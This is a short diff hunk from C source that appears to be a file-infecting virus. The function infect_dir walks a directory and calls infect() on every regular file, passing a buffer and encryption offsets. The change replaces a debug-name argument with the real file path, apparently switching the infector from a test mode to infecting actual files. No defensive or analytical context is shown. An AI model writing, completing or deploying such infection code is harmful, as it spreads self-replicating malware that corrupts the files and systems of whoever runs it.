@@ -172,7 +172,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		else if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
 			//print("     f:");println(tmp);
-			infect(tmp, debug_name(tmp), b, bn, crypt_off, crypt_len, opt);
+			infect(tmp, tmp/*debug_name(tmp)*/, b, bn, crypt_off, crypt_len, opt);
 		}
 		x += d->d_reclen;
 	}
